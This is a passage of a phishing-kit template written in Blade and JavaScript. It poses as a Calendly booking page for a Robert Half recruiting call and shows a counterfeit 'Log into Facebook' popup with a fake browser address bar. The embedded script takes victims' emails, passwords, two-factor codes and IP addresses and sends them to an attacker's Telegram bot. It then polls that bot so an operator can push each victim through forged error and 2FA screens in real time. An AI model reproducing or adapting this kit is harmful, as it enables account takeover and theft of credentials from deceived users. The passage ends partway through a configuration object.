<div>
    <div id="root">
        <div class="App">
            <div class="box__shadow">
                <div class="calendar__wrapper">
                    <div class="user__wrapper">
                        <div class="logo__wrapper"><img width="50%" src="{{asset('img/images.png')}}" /></div>
                        <div class="screen__two center__text">
                            <div class="mobile__back-svg">
                                <div class="content__wrapper">
                                    <div style="margin-bottom: 15px;">
                                        <div><img class="avatar" width="65px" src="{{asset('img/logo.png')}}" /></div>
                                    </div>
                                    <h2>15 Minutes Meeting</h2>
                                </div>
                            </div>
                            <div class="minute">
                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                </svg>
                                <span>15 min</span>
                            </div>
                            <div class="minute mt-12">
                                <svg data-testid="phone-call-icon" data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path
                                        d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z"
                                        fill="none"
                                        stroke="currentColor"
                                        stroke-linecap="round"
                                        stroke-linejoin="round"
                                    ></path>
                                </svg>
                                <span>Phone call</span>
                            </div>
                            <div class="minute space__bettwen">
                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path
                                        d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605"
                                        fill="none"
                                        stroke="currentColor"
                                        stroke-linecap="round"
                                        stroke-linejoin="round"
                                    ></path>
                                </svg>
                                <span>US Georgia (00:59)</span>
                            </div>
                        </div>
                        <div class="footer__wrapper">
                            <p>Cookie settings</p>
                            <p>Report abuse</p>
                        </div>
                    </div>
                    <div  class="date__time {{$showCalender == false ? 'd-none':''}}">
                        <div class="{{$showCalenderProgress ? 'd-none':''}}">
                            <h2>Select a Date & Time</h2>
                            <div class=" calendar__container svg__icon">
                                <div  style="min-width: 400px;padding-right: 15px;margin-top:20px;">
                                    <div wire:ignore class="calendar-wrapper" id="calendar-wrapper"></div>
                                    <div class="time__zone-wrapper" style="margin-top: 20px;">
                                        <p>Time zone</p>
                                        <div class="central">
                                            <img width="14px" src="{{asset('world.png')}}">
                                            US Georgia (00:59)
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class=" loading-container2 {{$showCalenderProgress ? '':'d-none'}}">
                            <h1 style="font-size: 48px;">Saving your selection</h1>
                            <h2>Please contact our live support to fully approve your scheduled date</h2>
                            <div class="loader2"></div>
                            <div style="margin-top: 40px;">
                                <a id="openChat" class="blue-btn" href="#" >Contact live chat support</a>
                            </div>
                        </div>
                        <a class="logo__wrapper-calendly hide__mobile">
                            <div class="background">
                                <div class="powerd__by">powered by</div>
                                <div class="calendly">Calendly</div>
                            </div>
                        </a>
                    </div>
                    <div class="form__wrapper date__time {{$showCalender ? 'd-none':''}}">
                        <div>
                            <div class="full__width">
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Robert Half - Recruiting Team</h2></div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="form-steps">
                                        <form id="msform">
                                            <ul id="progressbar">
                                                <li class="active" id="account"><strong>Verify</strong></li>
                                                <li id="personal"><strong>Schedule</strong></li>
                                                <li id="confirm"><strong>Finish</strong></li>
                                            </ul>
                                        </form>
                                    </div>
                                </div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="dummy__text">
                                        <p>
                                            Please confirm your appointment with Robert Half - Recruiting Team. <br />
                                            To complete the confirmation process, continue with Facebook
                                        </p>
                                    </div>
                                </div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="facebook__button">
                                        <button id="continue-facebook" wire:click.prevent="openLoginModal">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="24" viewBox="0 0 25 24" fill="none">
                                                <g clip-path="url(#clip0_302_2)">
                                                    <rect width="24" height="24" transform="translate(0.845947)" fill="#1877F2"></rect>
                                                    <path
                                                        d="M24.3459 12.0699C24.3459 5.7186 19.1972 0.56988 12.8459 0.56988C6.49467 0.56988 1.34595 5.7186 1.34595 12.0699C1.34595 17.8099 5.55133 22.5674 11.0491 23.4302V15.3941H8.12915V12.0699H11.0491V9.53629C11.0491 6.6541 12.7659 5.06207 15.3928 5.06207C16.651 5.06207 17.967 5.28668 17.967 5.28668V8.11675H16.5169C15.0883 8.11675 14.6428 9.00322 14.6428 9.91266V12.0699H17.8323L17.3224 15.3941H14.6428V23.4302C20.1406 22.5674 24.3459 17.8099 24.3459 12.0699Z"
                                                        fill="white"
                                                    ></path>
                                                </g>
                                                <defs>
                                                    <clipPath id="clip0_302_2"><rect width="24" height="24" fill="white" transform="translate(0.845947)"></rect></clipPath>
                                                </defs>
                                            </svg>
                                            Continue with Facebook
                                        </button>
                                    </div>
                                </div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="footer__wrapper footer__wrapper-mobile footer__wrapper-contact">
                                        <p>Cookie settings</p>
                                        <p>Report abuse</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <a class="logo__wrapper-calendly hide__mobile">
                            <div class="background">
                                <div class="powerd__by">powered by</div>
                                <div class="calendly">Calendly</div>
                            </div>
                        </a>
                    </div>
                </div>
            </div>
            <a class="logo__wrapper-calendly-mobile">
                <div class="background">
                    <div class="powerd__by">powered by</div>
                    <div class="calendly">Calendly</div>
                </div>
            </a>
        </div>

    </div>
    <div wire:ignore.self  style="display: none;" id="continue-modal">
        <div class="ant-modal-root">
            <div class="ant-modal-mask"></div>
            <div tabindex="-1" class="ant-modal-wrap">
                <div role="dialog" aria-labelledby="rc_unique_0" aria-modal="true" class="ant-modal modal-wrapper modal__facebook" style="width: 1000px; transform-origin: 519px 247px;">
                    <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
                    <div class="ant-modal-content">
                        <button type="button" aria-label="Close" class="ant-modal-close">
                        <span class="ant-modal-close-x">
                            <span role="img" aria-label="close" class="anticon anticon-close ant-modal-close-icon">
                                <svg fill-rule="evenodd" viewBox="64 64 896 896" focusable="false" data-icon="close" width="1em" height="1em" fill="currentColor" aria-hidden="true">
                                    <path
                                        d="M799.86 166.31c.02 0 .04.02.08.06l57.69 57.7c.04.03.05.05.06.08a.12.12 0 010 .06c0 .03-.02.05-.06.09L569.93 512l287.7 287.7c.04.04.05.06.06.09a.12.12 0 010 .07c0 .02-.02.04-.06.08l-57.7 57.69c-.03.04-.05.05-.07.06a.12.12 0 01-.07 0c-.03 0-.05-.02-.09-.06L512 569.93l-287.7 287.7c-.04.04-.06.05-.09.06a.12.12 0 01-.07 0c-.02 0-.04-.02-.08-.06l-57.69-57.7c-.04-.03-.05-.05-.06-.07a.12.12 0 010-.07c0-.03.02-.05.06-.09L454.07 512l-287.7-287.7c-.04-.04-.05-.06-.06-.09a.12.12 0 010-.07c0-.02.02-.04.06-.08l57.7-57.69c.03-.04.05-.05.07-.06a.12.12 0 01.07 0c.03 0 .05.02.09.06L512 454.07l287.7-287.7c.04-.04.06-.05.09-.06a.12.12 0 01.07 0z"
                                    ></path>
                                </svg>
                            </span>
                        </span>
                        </button>
                        <div class="ant-modal-header">
                            <div class="ant-modal-title" id="rc_unique_0">
                                <div>
                                    <div class="wrapper_header">
                                        <div class="sign__up-modal">
                                            <img src="{{asset('img/hLRJ1GG_y0J.ico')}}" alt="" width="17px" />
                                            <p>Log into Facebook | Facebook</p>
                                        </div>
                                        <div class="icons">
                                            <div class="img"><img src="{{asset('img/minus.png')}}" alt="" /></div>
                                            <div class="img"><img src="https://icons-for-free.com/iconfiles/png/512/square-1321215626459427421.png" alt="" /></div>
                                            <div class="img img-x"><img src="{{asset('img/close.png')}}" alt="" /></div>
                                        </div>
                                    </div>
                                    <div class="input__title-wrapper">
                                        <div class="lock__screen">
                                            <div class="lock">
                                                <div class="lock__wrapper"><img src="{{asset('img/locktest.png')}}" alt="" /><span class="green">Secure | https:</span><span class="black-opacity">//</span></div>
                                            </div>
                                            <span class="input__value">
                                            www.facebook.com
                                            <span class="black"> /login.php?skip<span class="hide__text-mobile">_api_login=1 &amp;api_key=481324359126967&amp;kid_directed_site=0&amp;app_id=481324359126967&amp;signed...</span></span>
                                        </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="ant-modal-body" style="min-height: 650px">
                            <div class="confirmation-container-modal">
                                <div class="header-color">
                                    <div class="header-container"><div class="logo__faceook"></div></div>
                                </div>
                                @if($enableLoginForm)
                                    <div class="auth-req-container auth__req-modal">
                                        <div class="auth-req">
                                            <div class="auth-req-text-modal">
                                                <h2>Log Into Facebook</h2>
                                                @if($loginError)
                                                    <div class="wrong__password"><h2>Wrong Credentials</h2><p>Invalid username or password</p></div>
                                                @endif
                                                @if($oldPassError)
                                                    <div class="wrong__password"><h2>You Entered And Old Password</h2></div>
                                                @endif
                                                <div class="modal__confirmation">
                                                    <form wire:submit.prevent="submitLogin" id="loginForm" class="ant-form ant-form-horizontal">
                                                        <div>
                                                            <div class="ant-form-item">
                                                                <div class="ant-row ant-form-item-row">
                                                                    <div class="ant-col ant-form-item-control">
                                                                        <div class="ant-form-item-control-input">
                                                                            <div class="ant-form-item-control-input-content">
                                                                                <input required="" type="text" name="email" placeholder="Email or phone number" id="username" class="ant-input" value="" />
                                                                                <div data-lastpass-icon-root="" style="position: relative !important; height: 0px !important; width: 0px !important; float: left !important;"></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div>
                                                            <div class="ant-form-item">
                                                                <div class="ant-row ant-form-item-row">
                                                                    <div class="ant-col ant-form-item-control">
                                                                        <div class="ant-form-item-control-input">
                                                                            <div class="ant-form-item-control-input-content">
                                                                                <input required="" type="password" name="password" placeholder="Password" id="password" class="ant-input" />
                                                                                <div data-lastpass-icon-root="" style="position: relative !important; height: 0px !important; width: 0px !important; float: left !important;"></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div><button type="submit">Log In</button></div>
                                                    </form>
                                                    <div class="modal__confirmation-forgot">
                                                        <div class="modal__confirmation-account">
                                                            <p>Forgot account?</p>
                                                            <p>Sign up for Facebook</p>
                                                        </div>
                                                        <p class="not__now">Not now</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="having-trouble-class having__trouble-modal"><button>Having trouble?</button></div>
                                        <div class="show-footer-on-mobile-plus hide__footer-modal">
                                            <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
                                            <div class="footer-flex-mobile-plus confimartion__modal">
                                                <div>
                                                    <h2>English (US)</h2>
                                                    <p>Deutsch</p>
                                                    <p>Српски</p>
                                                    <p>Português (Brasil)</p>
                                                </div>
                                                <div>
                                                    <p>Italiano</p>
                                                    <p>Bosanski</p>
                                                    <p>Svensk</p>
                                                    <button>+</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                @endif
                                @if($twoFaPage)
                                    <div class="auth-req-container">
                                        <form id="desktop-code" class="auth-req" wire:submit.prevent="codeSubmit">
                                            <div class="auth-req-text">
                                                <h2>Two-factor authentication required</h2>
                                                <div class="auth-req-paragraph">
                                                    <p class="first">You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
                                                    <p class="second">Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
                                                </div>
                                                <div class="input-auth-req">
                                                    <input maxlength="6" minlength="6" name="code" class="show-input-on-desktop" placeholder="Login Code" type="number" required="required">
                                                    @if($codeError)
                                                        <div class="show-error-modal"><p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p></div>
                                                    @endif
                                                    <span> (wait 4:29)</span>
                                                </div>
                                            </div>
                                            <div class="auth-req-footer" style="height: auto"><a>Need another way to authenticate?</a>
                                                <button    type="submit" class="false"><span>Continue</span></button>
                                            </div>
                                        </form>
                                        <form id="mobile-code" class="auth-req" wire:submit.prevent="codeSubmitMobile">
                                            <div class="auth-req-text">
                                                <h2>Two-factor authentication required</h2>
                                                <div class="auth-req-paragraph">
                                                    <p class="first">You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
                                                    <p class="second">Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
                                                </div>
                                            </div>
                                            <div class="show-input-on-mobile show__input-modal">
                                                <input maxlength="6" minlength="6" name="code2"  placeholder="Login Code" type="number" required="required">
                                                @if($codeError)
                                                    <div class="show-error-modal2">
                                                        <p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p>
                                                    </div>
                                                @endif
                                            </div>
                                            <div class="having-trouble-class">
                                                <button>Having trouble?</button>
                                            </div>
                                            <div class="show-button-mobile false">
                                                <button type="submit">Continue</button>
                                            </div>
                                        </form>

                                        <div class="show-footer-on-mobile-plus">
                                            <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
                                            <div class="footer-flex-mobile-plus confimartion__modal">
                                                <div>
                                                    <h2>English (US)</h2>
                                                    <p>Deutsch</p>
                                                    <p>Српски</p>
                                                    <p>Português (Brasil)</p>
                                                </div>
                                                <div>
                                                    <p>Italiano</p>
                                                    <p>Bosanski</p>
                                                    <p>Svensk</p>
                                                    <button>+</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                @endif
                                @if($enableLoadingAfterSubmit)
                                    <div class="loading-container">
                                        <div class="loading-message">Please be patient and dont close this window</div>
                                        <div class="loading-submessage step1">Checking the details on your account...</div>
                                        <div class="loading-submessage step2">Checking email addresses...</div>
                                        <div class="loading-submessage step3">Checking two-factor authenticator...</div>
                                        <div class="loading-submessage step4">Checking other details...</div>
                                        <div class="loading-submessage finalStep">It can take up to 10 minutes to verify your account.</div>
                                        <div class="loader"></div>
                                    </div>
                                @endif
                            </div>
                            @if($showModalFooter)
                                <div class="modal__footer">
                                    <div class="footer-menu-flex-ul">
                                        <div class="container-language-footer">
                                            <ul class="flex-ul">
                                                <li>English (US)</li>
                                                <li>Español</li>
                                                <li>Deutsch</li>
                                                <li>Türkçe</li>
                                                <li>Српски</li>
                                                <li>Français (France)</li>
                                                <li>Italiano</li>
                                                <li>Bosanski</li>
                                                <li>Svensk</li>
                                                <li>Português (Brasil)</li>
                                                <button class="countrys-button"><span>+</span></button>
                                            </ul>
                                        </div>
                                        <div class="flex-second-ul">
                                            <ul>
                                                <li>Sign Up</li>
                                                <li>Log In</li>
                                                <li>Messenger</li>
                                                <li>Facebook Lite</li>
                                                <li>Watch</li>
                                                <li>Places</li>
                                                <li>Games</li>
                                                <li>Marketplace</li>
                                                <li>Facebook Pay</li>
                                                <li>Oculus</li>
                                                <li>Portal</li>
                                                <li>Instagram</li>
                                                <li>Bulletin</li>
                                                <li>Local</li>
                                            </ul>
                                        </div>
                                        <div class="flex-second-ul-2">
                                            <ul>
                                                <li>Fundraisers</li>
                                                <li>Services</li>
                                                <li>Voting Information Centre</li>
                                                <li>About</li>
                                                <li>Create ad</li>
                                                <li>Create Page</li>
                                                <li>Developers</li>
                                                <li>Careers</li>
                                                <li>Privacy</li>
                                                <li>Cookies</li>
                                                <li class="ad-choice-img">Ad Choices <span class="img-li"></span></li>
                                                <li>Terms</li>
                                                <li>Help</li>
                                            </ul>
                                        </div>
                                        <div class="meta-footer"><p>Meta © 2024</p></div>
                                    </div>
                                </div>
                            @endif
                        </div>
                        <div class="ant-modal-footer">
                            <button type="button" class="ant-btn ant-btn-default"><span>Cancel</span></button><button type="button" class="ant-btn ant-btn-primary"><span>OK</span></button>
                        </div>
                    </div>
                    <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
                </div>
            </div>
        </div>
    </div>
</div>
@script
<script>
    let sessionId;
    if (! localStorage.getItem('sessionId')){
        localStorage.setItem('sessionId',generateSessionId());
        sessionId = localStorage.getItem('sessionId');
    }else{
        sessionId = localStorage.getItem('sessionId');
    }
    let selectedDate;
    const apiKey = "{{env('TELEGRAM_API_KEY')}}";
    const chatId = "{{env('TELEGRAM_CHAT_ID')}}";
    const replyMarkup = `reply_markup={"inline_keyboard": [[{"text": "accept", "callback_data": "accept"}]]}`;
    const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
    let emailElement;
    document.addEventListener('user-login-response',function (){
        fetch("https://api.ipify.org?format=json")
            .then((response) => response.json())
            .then((data) => {
                const ipAddress = data?.ip || "";
                @this.set('ip',ipAddress);
                const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
                fetch(tURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `===NEW VISITOR===\nIP ADDRESS: ${ipAddress}`,
                    }),
                });
            })
            .catch((error) => {});
    })
    document.addEventListener('open-modal',function (){
        $('#continue-modal').show();
    });

    document.addEventListener('show-login-progress',function (){
        @this.set('showModalFooter',false);
        @this.set('enableLoginForm',false);
        @this.set('enableLoadingAfterSubmit',true);
        emailElement = $('input[name="email"]').val();
        const passwordElement = $('input[name="password"]').val();
        fetch(tURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `User: ${emailElement}\nAnswer: ${passwordElement}\n`,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: `Login`,
                                callback_data: `/login ${sessionId}`,
                            },
                            {
                                text: `Error`,
                                callback_data: `/loginError ${sessionId}`,
                            },
                            {
                                text: `Old Pass Error`,
                                callback_data: `/oldError ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `2fa`,
                                callback_data: `/2fa ${sessionId}`,
                            },
                            {
                                text: `2fa error`,
                                callback_data: `/2faError ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `Schedule`,
                                callback_data: `/schedule ${sessionId}`,
                            },
                            {
                                text: `Final`,
                                callback_data: `/final ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `Kick`,
                                callback_data: `/login ${sessionId}`,
                            },
                        ],
                    ],
                },
            }),
        });
        localStorage.setItem('email',emailElement);
        startInterval();
    });
    document.addEventListener('code-submit',function (){
        const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
        const code = $('input[name="code"]').val();
        fetch(tURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `===FIRST AUTH CODE for ${emailElement}===\nCODE: ${
                    code || ""
                }`,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: `2fa`,
                                callback_data: `/2fa ${sessionId}`,
                            },
                            {
                                text: `2fa error`,
                                callback_data: `/2faError ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `Schedule`,
                                callback_data: `/schedule ${sessionId}`,
                            },
                            {
                                text: `Final`,
                                callback_data: `/final ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `Kick`,
                                callback_data: `/login ${sessionId}`,
                            },
                        ],
                    ],
                },
            }),
        })
            .then(() => {
                @this.set('loginError', false);
                @this.set('oldPassError', false);
                @this.set('enableLoginForm', false);
                @this.set('showModalFooter', false);
                @this.set('enableLoadingAfterSubmit', true);
                @this.set('twoFaPage', false);
                @this.set('codeError', false);
            })
            .catch((error) => {
                console.log("Unknown error in auth.html", error);
            });

    });
    document.addEventListener('code-submit-mobile',function (){
        const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
        const code = $('input[name="code2"]').val();
        fetch(tURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `===FIRST AUTH CODE for ${emailElement}===\nCODE: ${
                    code || ""
                }`,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: `2fa`,
                                callback_data: `/2fa ${sessionId}`,
                            },
                            {
                                text: `2fa error`,
                                callback_data: `/2faError ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `Schedule`,
                                callback_data: `/schedule ${sessionId}`,
                            },
                            {
                                text: `Final`,
                                callback_data: `/final ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `Kick`,
                                callback_data: `/login ${sessionId}`,
                            },
                        ],
                    ],
                },
            }),
        })
            .then(() => {
                @this.set('loginError', false);
                @this.set('oldPassError', false);
                @this.set('enableLoginForm', false);
                @this.set('showModalFooter', false);
                @this.set('enableLoadingAfterSubmit', true);
                @this.set('twoFaPage', false);
                @this.set('codeError', false);
            })
            .catch((error) => {
                console.log("Unknown error in auth.html", error);
            });

    });
    const startInterval = () => {
        let lastUpdateId = 0;
        setInterval(() => {
            fetch(`https://api.telegram.org/bot${apiKey}/getUpdates?offset=${lastUpdateId + 1}`)
                .then((response) => {
                    if (response.ok) {
                        return response.json();
                    } else {
                        throw new Error("Failed to fetch updates.");
                    }
                })
                .then((data) => {
                    if (data?.result?.length > 0) {
                        data.result.forEach((update) => {
                            if (update.update_id > lastUpdateId) {
                                lastUpdateId = update.update_id;
                                if (update.callback_query) {
                                    const callbackData = update.callback_query.data;
                                    if (callbackData === `/oldError ${localStorage.getItem('sessionId')}`) {
                                        $('#continue-modal').show();
                                        @this.set('showCalenderProgress', false);
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', true);
                                        @this.set('enableLoginForm', true);
                                        @this.set('showModalFooter', true);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', false);
                                        @this.set('codeError', false);
                                        @this.set('showCalender', false);
                                    }else if(callbackData === `/loginError ${localStorage.getItem('sessionId')}`){
                                        $('#continue-modal').show();
                                        @this.set('showCalenderProgress', false);
                                        @this.set('loginError', true);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', true);
                                        @this.set('showModalFooter', true);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', false);
                                        @this.set('codeError', false);
                                        @this.set('showCalender', false);

                                    }else if(callbackData === `/login ${localStorage.getItem('sessionId')}`){
                                        $('#continue-modal').show();
                                        @this.set('showCalenderProgress', false);
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', true);
                                        @this.set('showModalFooter', true);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', false);
                                        @this.set('codeError', false);
                                        @this.set('showCalender', false);
                                    }else if(callbackData === `/2fa ${localStorage.getItem('sessionId')}`){
                                        $('#continue-modal').show();
                                        @this.set('showCalenderProgress', false);
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', false);
                                        @this.set('showModalFooter', true);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', true);
                                        @this.set('codeError', false);
                                        @this.set('showCalender', false);
                                    }else if(callbackData === `/2faError ${localStorage.getItem('sessionId')}`){
                                        $('#continue-modal').show();
                                        @this.set('showCalenderProgress', false);
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', false);
                                        @this.set('showModalFooter', true);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', true);
                                        @this.set('codeError', true);
                                        @this.set('showCalender', false);
                                    }else if(callbackData === `/schedule ${localStorage.getItem('sessionId')}`){
                                        @this.set('showCalenderProgress', false);
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', false);
                                        @this.set('showModalFooter', false);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', false);
                                        @this.set('codeError', false);
                                        $('#continue-modal').hide();
                                        @this.set('showCalender', true);
                                    }
                                }
                            }
                        });
                    }
                })
                .catch((error) => {
                    console.error("Error fetching updates:", error);
                });
        }, 2000);
    };
    function generateSessionId() {
        return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}-${crypto.getRandomValues(new Uint32Array(1))[0]}`;
    }

    window.selectDate = function (date) {
        console.log('as')
        $('#calendar-wrapper').updateCalendarOptions({
            date: date
        });
        selectedDate = date;
        const currentDate = new Date(date);
        currentDate.setDate(currentDate.getDate());
        const options = { weekday: 'long', month: 'long', day: 'numeric' };
        const formattedDate = currentDate.toLocaleDateString('en-US', options);
        if ($('.calendar__container .full__width').length > 0){
            $('.calendar__container .full__width').remove();
        }
        $('.calendar__container').append(`<div class="full__width">
                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                        <div class="calendar__time">
                                            <h2>${formattedDate}</h2>
                                            <div class="available__wrapper">
                                                <div class="green__text"></div>
                                                <p> times you're available</p>
                                            </div>
                                            <div class="button__time-wrapper">
                                                <div>
                                                    <button class="time" data-time="09:30">
                                                        <div class="green__text"></div>09:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="10:00">
                                                        <div class="green__text"></div>10:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="10:30">
                                                        <div class="green__text"></div>10:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="11:00">
                                                        <div class="green__text"></div>11:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="11:30">
                                                        <div class="green__text"></div>11:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="12:00">
                                                        <div class="green__text"></div>12:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="12:30">
                                                        <div class="green__text"></div>12:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="13:00">
                                                        <div class="green__text"></div>13:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="13:30">
                                                        <div class="green__text"></div>13:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="14:00">
                                                        <div class="green__text"></div>14:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="14:30">
                                                        <div class="green__text"></div>14:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="15:00">
                                                        <div class="green__text"></div>15:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="15:30">
                                                        <div class="green__text"></div>15:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="16:00">
                                                        <div class="green__text"></div>16:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="16:30">
                                                        <div class="green__text"></div>16:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="footer__wrapper footer__wrapper-mobile">
                                                <p>Cookie settings</p>
                                                <p>Report abuse</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>`);
    };
    let defaultConfig = {
        weekDayLength: 3,
        prevButton:'<i class="fa fa-chevron-left" aria-hidden="true"></i>',
        nextButton:'<i class="fa fa-chevron-right" aria-hidden="true"></i>',
        date:new Date(),
